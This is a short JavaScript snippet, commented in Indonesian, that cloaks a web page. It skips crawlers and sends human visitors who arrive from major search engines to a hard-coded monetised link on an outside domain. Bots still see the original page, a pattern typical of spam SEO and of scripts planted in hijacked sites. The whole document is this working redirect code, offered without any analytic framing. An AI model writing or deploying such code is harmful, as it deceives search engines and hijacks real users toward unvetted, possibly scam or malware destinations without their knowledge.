(function() {
    // 1. Referrer yang diizinkan
    const searchEngines = [
        "google.com", 
        "bing.com", 
        "yahoo.com", 
        "baidu.com", 
        "yandex.com", 
        "duckduckgo.com"
    ];

    // 2. Deteksi Bot
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);

    // 3. URL referrer
    const referrer = document.referrer.toLowerCase();
    const directLink = "https://anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3";

    if (!isBot && referrer !== "") {
        // Periksa apakah referrer berasal dari salah satu search engine di atas
        const isFromSearchEngine = searchEngines.some(engine => referrer.includes(engine));

        if (isFromSearchEngine) {
            window.location.href = directLink;
        }
    }
})();
